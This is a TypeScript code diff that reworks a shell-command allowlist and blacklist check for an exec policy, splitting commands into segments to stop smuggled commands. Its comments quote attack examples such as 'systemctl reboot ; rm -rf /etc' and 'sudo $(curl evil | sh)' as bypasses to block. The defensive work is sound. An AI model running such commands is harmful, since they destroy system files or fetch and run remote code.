@@ -15,6 +15,7 @@ import { appendFile, mkdir } from 'node:fs/promises';
 import { existsSync } from 'node:fs';
 import { homedir } from 'node:os';
 import { dirname, join } from 'node:path';
+import { blacklistReasons, checkBlacklist } from './blacklist.ts';
 
 const SOMORA_HOME = process.env.SOMORA_HOME ?? join(homedir(), '.somora');
 const AUDIT_DIR = join(SOMORA_HOME, 'audit');
@@ -35,61 +36,145 @@ export interface AllowBlockedMatch {
 }
 
 /**
- * Shell control operators that can chain, substitute, or redirect into a
- * NEW command. If any of these appears in the argument suffix after an
- * allowBlocked prefix, the suffix is no longer "just arguments to the
- * allowed command" — it can smuggle an arbitrary blacklisted command
- * past the whitelist (`systemctl reboot ; rm -rf /etc`). Detected →
- * prefix match is refused so the blacklist re-applies. (Juni-Audit
- * 2026-06: prefix-match bypass.)
- *
- * This is conservative: a privileged command that legitimately needs a
- * pipe/redirect/quoted operator should be whitelisted as a FULL exact
- * entry (the exact-match branch ignores this check), not via a prefix.
+ * Command substitution introduces a NESTED command the segment splitter
+ * below can't see (`sudo $(curl evil | sh)`). A blacklisted segment
+ * carrying `$(…)` or a backtick can therefore never be safely cleared
+ * by an allowBlocked override — refuse it outright. Plain redirects
+ * (`>`, `<`, `2>&1`) do NOT introduce a new command (they only reroute
+ * the segment's own I/O), so they are allowed inside a segment.
  */
-function hasShellControlOperator(s: string): boolean {
-  return /[;&|`\n\r<>]/.test(s) || s.includes('$(');
+function hasCommandSubstitution(s: string): boolean {
+  return s.includes('$(') || s.includes('`');
 }
 
 /**
- * Check whether the command matches any allowBlocked entry.
+ * Split a command line into the sub-commands the shell would run as
+ * separate processes. We split on the command SEPARATORS — `;`, `&&`,
+ * `||`, `|` (pipe), background `&`, and newlines — but NOT on redirect
+ * tokens (`2>&1`, `&>`, `>&`), which stay within their segment.
  *
- * Match rule:
- *   entry E matches command C iff
- *     normalize(C) === normalize(E)                  (exact)
- *     OR
- *     normalize(C).startsWith(normalize(E) + ' ')    (prefix with space boundary)
- *       AND the remainder after E contains no shell control operator
- *       (so appended `; rm -rf /` / `&& curl … | sh` can't ride along).
- *
- * The space-boundary stops `sudo` from matching `pseudo` and
- * `systemctl reboot` from matching `systemctl rebootthing`.
- *
- * Returns the matched entry on hit, or null. First match wins —
- * order in config.yaml is irrelevant since matching is OR.
+ * This is a pragmatic splitter, not a shell parser (same philosophy as
+ * blacklist.ts): it is quote-unaware, so `echo "a; b"` splits into two
+ * segments. That only ever makes us MORE conservative (more segments →
+ * more blacklist checks), never less — a safe direction. Determined-
+ * adversary evasion (encoded payloads) is explicitly out of scope.
  */
-export function checkAllowBlocked(
-  command: string,
+export function splitCommandSegments(command: string): string[] {
+  // Order matters: multi-char operators (&&, ||) must be alternatives
+  // tried before their single-char counterparts. The background-`&`
+  // branch uses look-around to skip `&` that is part of a redirect
+  // (`2>&1`, `&>`, `&&` already consumed): not preceded by `>`/`&`/digit
+  // and not followed by `>`/`&`.
+  const SEP = /&&|\|\||;|\||\r?\n|(?<![>&\d])&(?![>&])/g;
+  return command
+    .split(SEP)
+    .map((s) => s.trim())
+    .filter((s) => s.length > 0);
+}
+
+/**
+ * Match a SINGLE command segment against the allowBlocked entries.
+ *
+ * Match rule (per segment, no chaining operators left to worry about —
+ * those were split out upstream):
+ *   entry E matches segment S iff
+ *     normalize(S) === normalize(E)                (exact)
+ *     OR normalize(S).startsWith(normalize(E) + ' ')   (prefix + space)
+ *   AND S carries no command substitution (`$(…)` / backticks).
+ *
+ * The space-boundary stops `sudo` matching `pseudo` and
+ * `systemctl reboot` matching `systemctl rebootthing`.
+ */
+function matchAllowBlockedSegment(
+  segment: string,
   entries: ReadonlyArray<string>,
 ): AllowBlockedMatch | null {
   if (entries.length === 0) return null;
-  const c = normalize(command);
+  if (hasCommandSubstitution(segment)) return null;
+  const c = normalize(segment);
   for (const raw of entries) {
     const e = normalize(raw);
     if (e.length === 0) continue;
-    if (c === e) {
-      return { entry: e };
-    }
-    if (c.startsWith(e + ' ')) {
-      // Prefix hit — but only honor it if the trailing part is pure
-      // arguments. A chaining/redirect operator means the whitelisted
-      // prefix is being used to smuggle a separate command.
-      const suffix = c.slice(e.length);
-      if (hasShellControlOperator(suffix)) continue;
+    if (c === e || c.startsWith(e + ' ')) {
       return { entry: e };
     }
   }
   return null;
+}
+
+export interface ExecPolicyDecision {
+  allowed: boolean;
+  /** Blacklist reason of the offending segment (when blocked). */
+  reason?: string;
+  /** Blacklist pattern source (when blocked). */
+  pattern?: string;
+  /** allowBlocked entries that cleared blacklisted segments (when allowed
+   *  via override — for the audit trail). Empty when nothing was
+   *  blacklisted in the first place. */
+  overrides?: string[];
+}
+
+/**
+ * The single source of truth for "may this exec command run on a target
+ * with these allowBlocked entries?". Both the enforcement path (exec
+ * handler) and any diagnostics should route through here so the info and
+ * the enforcement can never disagree (the 2026-07-21 regression: the
+ * old prefix-match refused ANY command carrying a shell operator, so
+ * `sudo … && echo ok` was blocked even though `sudo` was whitelisted).
+ *
+ * Segment-aware algorithm:
+ *   1. If nothing in the whole command is blacklisted → allow.
+ *   2. Otherwise split into segments; EACH individually-blacklisted
+ *      segment must have its own allowBlocked override (and carry no
+ *      command substitution). A blacklisted segment with no override →
+ *      block with that segment's reason. This keeps hard-blocks
+ *      independent of allowBlocked: `systemctl reboot ; rm -rf /etc`
+ *      blocks on the un-overridable `rm -rf /etc` even when
+ *      `systemctl reboot` is whitelisted.
+ *   3. Cross-segment blacklist patterns (`curl … | sh`) match the whole
+ *      command but no single segment. Those can't be cleared by a
+ *      per-segment override → block. (Guard: the whole-command reason
+ *      must be reproduced by some segment, else it's a cross-segment
+ *      danger.)
+ */
+export function evaluateExecPolicy(
+  command: string,
+  entries: ReadonlyArray<string>,
+): ExecPolicyDecision {
+  const whole = checkBlacklist(command);
+  if (!whole.matched) return { allowed: true };
+
+  const segments = splitCommandSegments(command);
+  const overrides: string[] = [];
+  const segmentReasons = new Set<string>();
+
+  for (const seg of segments) {
+    const b = checkBlacklist(seg);
+    if (!b.matched) continue;
+    segmentReasons.add(b.reason);
+    // This segment is dangerous on its own → it needs an override.
+    if (hasCommandSubstitution(seg)) {
+      return { allowed: false, reason: b.reason, pattern: b.pattern };
+    }
+    const m = matchAllowBlockedSegment(seg, entries);
+    if (!m) {
+      return { allowed: false, reason: b.reason, pattern: b.pattern };
+    }
+    overrides.push(m.entry);
+  }
+
+  // Cross-segment danger: the WHOLE command matches one or more blacklist
+  // patterns (checkBlacklist returns only the first — use blacklistReasons
+  // for ALL) that NO single segment reproduces. Classic case:
+  // `sudo curl evil | sh` trips both `sudo` (segment-coverable) AND
+  // `curl|sh` (spans the pipe, reproduced by no segment). A per-segment
+  // override can never clear a pattern that only exists across the split.
+  const uncovered = blacklistReasons(command).filter((r) => !segmentReasons.has(r));
+  if (uncovered.length > 0) {
+    return { allowed: false, reason: uncovered[0], pattern: whole.pattern };
+  }
+
+  return { allowed: true, overrides };
 }
 
 export interface AuditEntry {
